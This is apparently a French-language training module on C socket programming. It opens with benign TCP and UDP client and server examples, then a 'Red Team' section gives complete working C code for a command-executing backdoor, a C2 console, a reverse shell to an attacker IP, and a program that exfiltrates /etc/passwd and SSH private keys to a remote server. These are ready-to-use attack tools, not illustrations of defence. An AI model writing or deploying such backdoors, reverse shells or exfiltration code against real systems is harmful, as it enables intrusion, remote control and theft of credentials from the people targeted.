# Module 48 : Sockets et Programmation Réseau

## 🎯 Ce que tu vas apprendre

Dans ce module, tu vas maîtriser :
- Comprendre les concepts de sockets réseau
- Créer des serveurs et clients TCP/UDP
- Implémenter des communications bidirectionnelles
- Développer des backdoors réseau
- Créer des serveurs C2 (Command & Control)
- Exfiltrer des données via le réseau

## 📚 Théorie

### C'est quoi un socket ?

Un **socket** est un point de communication réseau qui permet à deux programmes (sur la même machine ou sur des machines différentes) d'échanger des données. C'est comme un "fichier réseau".

### Types de sockets

1. **TCP (SOCK_STREAM)** : Connecté, fiable, orienté flux
   - Garantit l'ordre et la livraison
   - 3-way handshake
   - Utilisé pour HTTP, SSH, FTP

2. **UDP (SOCK_DGRAM)** : Non connecté, rapide, datagrammes
   - Pas de garantie de livraison
   - Plus rapide que TCP
   - Utilisé pour DNS, streaming, jeux

### Modèle Client-Serveur

```
Client                          Serveur
  │                               │
  │  1. socket()                  │  1. socket()
  │                               │  2. bind()
  │                               │  3. listen()
  │                               │  4. accept() [BLOQUANT]
  │  2. connect() ───────────────►│
  │◄─────────────── Connexion établie
  │                               │
  │  3. send()/recv() ◄──────────►│  send()/recv()
  │                               │
  │  4. close()                   │  close()
```

### Fonctions principales

```c
// Créer un socket
int socket(int domain, int type, int protocol);

// Lier à une adresse (serveur)
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

// Écouter les connexions (serveur)
int listen(int sockfd, int backlog);

// Accepter une connexion (serveur)
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);

// Se connecter (client)
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

// Envoyer des données
ssize_t send(int sockfd, const void *buf, size_t len, int flags);

// Recevoir des données
ssize_t recv(int sockfd, void *buf, size_t len, int flags);
```

## 🔍 Visualisation

### Communication TCP

```
┌─────────────────────────────────────────────────────┐
│           TCP THREE-WAY HANDSHAKE                   │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Client                              Serveur        │
│    │                                    │           │
│    │─────── SYN (seq=100) ─────────────►│           │
│    │                                    │           │
│    │◄────── SYN-ACK (seq=300,          │           │
│    │          ack=101) ─────────────────│           │
│    │                                    │           │
│    │─────── ACK (ack=301) ─────────────►│           │
│    │                                    │           │
│    │          CONNECTÉ                  │           │
│    │                                    │           │
│    │─────── DATA ──────────────────────►│           │
│    │◄────── ACK ────────────────────────│           │
│    │                                    │           │
│    │◄────── DATA ───────────────────────│           │
│    │─────── ACK ────────────────────────►│           │
│    │                                    │           │
└─────────────────────────────────────────────────────┘
```

### Architecture Socket

```
┌─────────────────────────────────────────────────────┐
│              SOCKET LAYERS                          │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Application (Programme C)                          │
│  ┌────────────────────────────────────┐            │
│  │  send() / recv()                   │            │
│  └──────────────┬─────────────────────┘            │
│                 │                                   │
│  Socket API     ▼                                   │
│  ┌────────────────────────────────────┐            │
│  │  Socket Layer                      │            │
│  │  (gestion des connexions)          │            │
│  └──────────────┬─────────────────────┘            │
│                 │                                   │
│  Transport      ▼                                   │
│  ┌────────────────────────────────────┐            │
│  │  TCP / UDP                         │            │
│  │  (segmentation, fiabilité)         │            │
│  └──────────────┬─────────────────────┘            │
│                 │                                   │
│  Network        ▼                                   │
│  ┌────────────────────────────────────┐            │
│  │  IP (routage)                      │            │
│  └──────────────┬─────────────────────┘            │
│                 │                                   │
│  Link           ▼                                   │
│  ┌────────────────────────────────────┐            │
│  │  Ethernet / WiFi                   │            │
│  └────────────────────────────────────┘            │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Structure sockaddr_in

```
┌─────────────────────────────────────────────────────┐
│          struct sockaddr_in                         │
├─────────────────────────────────────────────────────┤
│                                                     │
│  ┌──────────────────────────────────┐              │
│  │ sin_family    (AF_INET)          │ 2 bytes      │
│  ├──────────────────────────────────┤              │
│  │ sin_port      (port en           │ 2 bytes      │
│  │               network byte order)│              │
│  ├──────────────────────────────────┤              │
│  │ sin_addr      (adresse IP)       │ 4 bytes      │
│  │               192.168.1.100      │              │
│  ├──────────────────────────────────┤              │
│  │ sin_zero      (padding)          │ 8 bytes      │
│  └──────────────────────────────────┘              │
│                                                     │
│  Exemple:                                           │
│    sin_family = AF_INET                             │
│    sin_port = htons(4444)                           │
│    sin_addr.s_addr = inet_addr("192.168.1.100")    │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Serveur Multi-clients

```
┌─────────────────────────────────────────────────────┐
│         MULTI-CLIENT SERVER                         │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Serveur Principal                                  │
│  ┌────────────────┐                                │
│  │ listen_socket  │                                │
│  │ (port 4444)    │                                │
│  └───────┬────────┘                                │
│          │                                          │
│          │  accept() ──┐                            │
│          │             │                            │
│  ┌───────▼────────┐   ┌▼──────────────┐            │
│  │ Client 1       │   │ Client 2      │            │
│  │ Thread/Process │   │ Thread/Process│            │
│  │                │   │               │            │
│  │ recv()/send()  │   │ recv()/send() │            │
│  └────────────────┘   └───────────────┘            │
│                                                     │
│  ┌──────────────┐     ┌──────────────┐             │
│  │ Client 3     │     │ Client N     │             │
│  │ Thread       │ ... │ Thread       │             │
│  └──────────────┘     └──────────────┘             │
│                                                     │
└─────────────────────────────────────────────────────┘
```

## 💻 Exemple pratique

### Exemple 1 : Serveur TCP simple

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 8080
#define BUFFER_SIZE 1024

int main() {
    int server_fd, client_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    char buffer[BUFFER_SIZE] = {0};

    // 1. Créer le socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    printf("[+] Socket created successfully\n");

    // Option pour réutiliser l'adresse
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    // 2. Configurer l'adresse
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;  // Toutes les interfaces
    server_addr.sin_port = htons(PORT);

    // 3. Bind (lier le socket à l'adresse)
    if (bind(server_fd, (struct sockaddr*)&server_addr,
             sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }
    printf("[+] Bind successful on port %d\n", PORT);

    // 4. Listen (écouter les connexions)
    if (listen(server_fd, 3) < 0) {
        perror("Listen failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }
    printf("[+] Listening for connections...\n");

    // 5. Accept (accepter une connexion)
    client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);
    if (client_fd < 0) {
        perror("Accept failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("[+] Client connected: %s:%d\n",
           inet_ntoa(client_addr.sin_addr),
           ntohs(client_addr.sin_port));

    // 6. Recevoir des données
    int bytes_received = recv(client_fd, buffer, BUFFER_SIZE, 0);
    if (bytes_received > 0) {
        printf("[+] Received: %s\n", buffer);

        // 7. Envoyer une réponse
        const char *response = "Message received!";
        send(client_fd, response, strlen(response), 0);
        printf("[+] Response sent\n");
    }

    // 8. Fermer les connexions
    close(client_fd);
    close(server_fd);
    printf("[+] Server closed\n");

    return 0;
}
```

### Exemple 2 : Client TCP simple

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 8080
#define BUFFER_SIZE 1024

int main() {
    int sock_fd;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE] = {0};
    const char *message = "Hello from client!";

    // 1. Créer le socket
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd == -1) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    printf("[+] Socket created\n");

    // 2. Configurer l'adresse du serveur
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);

    // Convertir l'adresse IP
    if (inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr) <= 0) {
        perror("Invalid address");
        close(sock_fd);
        exit(EXIT_FAILURE);
    }

    // 3. Connecter au serveur
    if (connect(sock_fd, (struct sockaddr*)&server_addr,
                sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock_fd);
        exit(EXIT_FAILURE);
    }
    printf("[+] Connected to server\n");

    // 4. Envoyer des données
    send(sock_fd, message, strlen(message), 0);
    printf("[+] Message sent: %s\n", message);

    // 5. Recevoir la réponse
    int bytes_received = recv(sock_fd, buffer, BUFFER_SIZE, 0);
    if (bytes_received > 0) {
        printf("[+] Server response: %s\n", buffer);
    }

    // 6. Fermer le socket
    close(sock_fd);
    printf("[+] Connection closed\n");

    return 0;
}
```

### Exemple 3 : Serveur TCP multi-clients (threads)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 8080
#define BUFFER_SIZE 1024
#define MAX_CLIENTS 10

typedef struct {
    int socket;
    struct sockaddr_in address;
    int id;
} client_info_t;

void* handle_client(void* arg) {
    client_info_t *client = (client_info_t*)arg;
    char buffer[BUFFER_SIZE];

    printf("[+] Client %d connected: %s:%d\n",
           client->id,
           inet_ntoa(client->address.sin_addr),
           ntohs(client->address.sin_port));

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        int bytes = recv(client->socket, buffer, BUFFER_SIZE, 0);

        if (bytes <= 0) {
            printf("[-] Client %d disconnected\n", client->id);
            break;
        }

        printf("[Client %d]: %s\n", client->id, buffer);

        // Echo back
        send(client->socket, buffer, bytes, 0);
    }

    close(client->socket);
    free(client);
    return NULL;
}

int main() {
    int server_fd;
    struct sockaddr_in server_addr;
    int client_count = 0;

    // Créer le socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }

    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    // Configurer l'adresse
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    // Bind
    if (bind(server_fd, (struct sockaddr*)&server_addr,
             sizeof(server_addr)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }

    // Listen
    if (listen(server_fd, MAX_CLIENTS) < 0) {
        perror("Listen failed");
        exit(EXIT_FAILURE);
    }

    printf("[+] Multi-client server listening on port %d\n", PORT);

    // Boucle d'acceptation
    while (1) {
        client_info_t *client = malloc(sizeof(client_info_t));
        socklen_t client_len = sizeof(client->address);

        client->socket = accept(server_fd,
                                (struct sockaddr*)&client->address,
                                &client_len);

        if (client->socket < 0) {
            perror("Accept failed");
            free(client);
            continue;
        }

        client->id = ++client_count;

        // Créer un thread pour ce client
        pthread_t thread;
        if (pthread_create(&thread, NULL, handle_client, client) != 0) {
            perror("Thread creation failed");
            close(client->socket);
            free(client);
        } else {
            pthread_detach(thread);
        }
    }

    close(server_fd);
    return 0;
}
```

### Exemple 4 : Client/Serveur UDP

```c
// ===== Serveur UDP =====
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 8080
#define BUFFER_SIZE 1024

int main() {
    int sock_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    char buffer[BUFFER_SIZE];

    // Créer socket UDP
    sock_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock_fd == -1) {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }

    // Configurer l'adresse
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    // Bind
    if (bind(sock_fd, (struct sockaddr*)&server_addr,
             sizeof(server_addr)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }

    printf("[+] UDP Server listening on port %d\n", PORT);

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);

        // Recevoir (pas besoin d'accept avec UDP)
        int bytes = recvfrom(sock_fd, buffer, BUFFER_SIZE, 0,
                            (struct sockaddr*)&client_addr, &client_len);

        if (bytes > 0) {
            printf("[+] Received from %s:%d: %s\n",
                   inet_ntoa(client_addr.sin_addr),
                   ntohs(client_addr.sin_port),
                   buffer);

            // Répondre
            const char *response = "ACK";
            sendto(sock_fd, response, strlen(response), 0,
                   (struct sockaddr*)&client_addr, client_len);
        }
    }

    close(sock_fd);
    return 0;
}

// ===== Client UDP =====
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 8080
#define BUFFER_SIZE 1024

int main() {
    int sock_fd;
    struct sockaddr_in server_addr;
    socklen_t server_len = sizeof(server_addr);
    char buffer[BUFFER_SIZE];
    const char *message = "Hello UDP!";

    // Créer socket UDP
    sock_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock_fd == -1) {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }

    // Configurer l'adresse du serveur
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr);

    // Envoyer (pas besoin de connect avec UDP)
    sendto(sock_fd, message, strlen(message), 0,
           (struct sockaddr*)&server_addr, server_len);
    printf("[+] Message sent: %s\n", message);

    // Recevoir la réponse
    memset(buffer, 0, BUFFER_SIZE);
    int bytes = recvfrom(sock_fd, buffer, BUFFER_SIZE, 0,
                        (struct sockaddr*)&server_addr, &server_len);

    if (bytes > 0) {
        printf("[+] Server response: %s\n", buffer);
    }

    close(sock_fd);
    return 0;
}
```

## 🎯 Application Red Team

### 1. Backdoor TCP simple

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 4444
#define BUFFER_SIZE 4096

int main() {
    int sock_fd;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];

    // Créer le socket
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd == -1) {
        exit(EXIT_FAILURE);
    }

    // Configurer l'adresse du serveur C2
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, "192.168.1.100", &server_addr.sin_addr);

    // Connexion au serveur C2
    if (connect(sock_fd, (struct sockaddr*)&server_addr,
                sizeof(server_addr)) < 0) {
        close(sock_fd);
        exit(EXIT_FAILURE);
    }

    // Envoyer les infos système
    char *info = "Backdoor connected from victim machine\n";
    send(sock_fd, info, strlen(info), 0);

    // Boucle de commandes
    while (1) {
        memset(buffer, 0, BUFFER_SIZE);

        // Recevoir commande
        int bytes = recv(sock_fd, buffer, BUFFER_SIZE, 0);
        if (bytes <= 0) break;

        // Exécuter la commande
        FILE *fp = popen(buffer, "r");
        if (fp) {
            char output[BUFFER_SIZE];
            while (fgets(output, sizeof(output), fp) != NULL) {
                send(sock_fd, output, strlen(output), 0);
            }
            pclose(fp);
        }

        // Envoyer marqueur de fin
        send(sock_fd, "\n[DONE]\n", 8, 0);
    }

    close(sock_fd);
    return 0;
}
```

### 2. Serveur C2 (Command & Control)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 4444
#define BUFFER_SIZE 4096

int main() {
    int server_fd, client_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    char buffer[BUFFER_SIZE];
    char command[256];

    // Créer socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    // Configurer
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    // Bind et Listen
    bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr));
    listen(server_fd, 5);

    printf("[C2] Listening on port %d...\n", PORT);

    // Accepter connexion backdoor
    client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);
    printf("[C2] Backdoor connected: %s\n", inet_ntoa(client_addr.sin_addr));

    // Recevoir info initiale
    recv(client_fd, buffer, BUFFER_SIZE, 0);
    printf("%s", buffer);

    // Boucle de commandes
    while (1) {
        printf("C2> ");
        fgets(command, sizeof(command), stdin);
        command[strcspn(command, "\n")] = 0;

        if (strcmp(command, "exit") == 0) {
            break;
        }

        // Envoyer commande
        send(client_fd, command, strlen(command), 0);

        // Recevoir résultat
        memset(buffer, 0, BUFFER_SIZE);
        while (1) {
            int bytes = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
            if (bytes <= 0) break;

            buffer[bytes] = '\0';
            printf("%s", buffer);

            if (strstr(buffer, "[DONE]") != NULL) {
                break;
            }
        }
    }

    close(client_fd);
    close(server_fd);
    return 0;
}
```

### 3. Reverse shell

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define ATTACKER_IP "192.168.1.100"
#define ATTACKER_PORT 4444

int main() {
    int sock_fd;
    struct sockaddr_in server_addr;

    // Créer socket
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);

    // Configurer adresse attaquant
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(ATTACKER_PORT);
    inet_pton(AF_INET, ATTACKER_IP, &server_addr.sin_addr);

    // Connexion
    connect(sock_fd, (struct sockaddr*)&server_addr, sizeof(server_addr));

    // Rediriger stdin, stdout, stderr vers le socket
    dup2(sock_fd, 0);  // stdin
    dup2(sock_fd, 1);  // stdout
    dup2(sock_fd, 2);  // stderr

    // Spawner un shell
    execl("/bin/sh", "sh", NULL);

    close(sock_fd);
    return 0;
}
```

### 4. Exfiltration de données

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define EXFIL_SERVER "192.168.1.100"
#define EXFIL_PORT 5555

void exfiltrate_file(const char *filename) {
    int sock_fd;
    struct sockaddr_in server_addr;
    char buffer[4096];

    // Ouvrir le fichier
    FILE *file = fopen(filename, "rb");
    if (!file) {
        return;
    }

    // Créer socket
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);

    // Configurer
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(EXFIL_PORT);
    inet_pton(AF_INET, EXFIL_SERVER, &server_addr.sin_addr);

    // Connexion
    if (connect(sock_fd, (struct sockaddr*)&server_addr,
                sizeof(server_addr)) < 0) {
        fclose(file);
        close(sock_fd);
        return;
    }

    // Envoyer le nom du fichier
    send(sock_fd, filename, strlen(filename), 0);
    send(sock_fd, "\n", 1, 0);

    // Envoyer le contenu
    size_t bytes;
    while ((bytes = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        send(sock_fd, buffer, bytes, 0);
    }

    fclose(file);
    close(sock_fd);
}

int main() {
    // Exfiltrer des fichiers sensibles
    exfiltrate_file("/etc/passwd");
    exfiltrate_file("/home/user/.ssh/id_rsa");
    exfiltrate_file("/home/user/Documents/secrets.txt");

    return 0;
}
```

### 5. Serveur de réception d'exfiltration

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 5555
#define BUFFER_SIZE 4096

int main() {
    int server_fd, client_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    char buffer[BUFFER_SIZE];
    char filename[256];

    // Créer socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    // Configurer
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    // Bind et Listen
    bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr));
    listen(server_fd, 5);

    printf("[EXFIL] Server listening on port %d\n", PORT);

    int file_count = 0;

    while (1) {
        client_fd = accept(server_fd, (struct sockaddr*)&client_addr,
                          &client_len);

        printf("[+] Connection from: %s\n", inet_ntoa(client_addr.sin_addr));

        // Recevoir le nom du fichier
        memset(filename, 0, sizeof(filename));
        recv(client_fd, filename, sizeof(filename), 0);
        filename[strcspn(filename, "\n")] = 0;

        // Créer fichier local
        char local_filename[512];
        snprintf(local_filename, sizeof(local_filename),
                 "exfil_%d_%s", ++file_count, filename);

        // Remplacer / par _
        for (char *p = local_filename; *p; p++) {
            if (*p == '/') *p = '_';
        }

        FILE *file = fopen(local_filename, "wb");
        if (!file) {
            close(client_fd);
            continue;
        }

        printf("[+] Receiving: %s -> %s\n", filename, local_filename);

        // Recevoir et écrire le contenu
        int bytes;
        while ((bytes = recv(client_fd, buffer, BUFFER_SIZE, 0)) > 0) {
            fwrite(buffer, 1, bytes, file);
        }

        fclose(file);
        close(client_fd);

        printf("[+] File saved: %s\n", local_filename);
    }

    close(server_fd);
    return 0;
}
```

## 📝 Points clés à retenir

1. **TCP vs UDP** : TCP = fiable, UDP = rapide
2. **Serveur** : socket() → bind() → listen() → accept()
3. **Client** : socket() → connect()
4. **Communication** : send() / recv()
5. **Multi-clients** : Utiliser threads ou fork()
6. **Byte order** : htons() / ntohs() pour les ports
7. **Adresses** : inet_pton() / inet_ntoa()

### Fonctions essentielles

```c
// Conversion byte order
uint16_t htons(uint16_t hostshort);    // Host to Network Short
uint16_t ntohs(uint16_t netshort);     // Network to Host Short

// Conversion adresses
int inet_pton(int af, const char *src, void *dst);
char *inet_ntoa(struct in_addr in);

// Options socket
int setsockopt(int sockfd, int level, int optname,
               const void *optval, socklen_t optlen);
```

### Pièges à éviter

1. **Byte order** : Toujours utiliser htons()/ntohs()
2. **Buffer overflow** : Vérifier la taille des recv()
3. **Fermeture** : Toujours close() les sockets
4. **Erreurs** : Vérifier les valeurs de retour
5. **Threads** : Libérer la mémoire correctement

## ➡️ Prochaine étape

Maintenant que tu maîtrises la programmation réseau, tu es prêt pour le **Module 49 : Injection de Code et Shellcode**, où tu apprendras à injecter du code malveillant dans des processus distants et créer des shellcodes personnalisés.

### Ce que tu as appris
- Créer des sockets TCP/UDP
- Implémenter des serveurs multi-clients
- Développer des backdoors réseau
- Créer des serveurs C2
- Exfiltrer des données

### Ce qui t'attend
- Injection de code dans des processus
- Création de shellcodes
- Techniques d'injection (DLL, Process Hollowing)
- Bypass de protections mémoire
- Exploitation avancée
